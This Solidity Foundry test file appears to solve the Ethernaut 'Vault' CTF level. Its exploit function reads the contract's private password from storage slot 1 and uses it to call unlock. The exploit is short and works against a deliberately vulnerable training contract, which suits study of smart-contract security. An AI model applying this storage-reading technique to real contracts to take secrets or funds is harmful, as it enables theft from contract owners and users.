// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Vault.sol";
import "src/levels/VaultFactory.sol";

contract TestVault is BaseTest {
    Vault private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new VaultFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Vault(levelAddress);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */
        vm.startPrank(player);

        bytes32 password = vm.load(address(level), bytes32(uint256(1)));

        level.unlock(password);

        vm.stopPrank();
    }
}
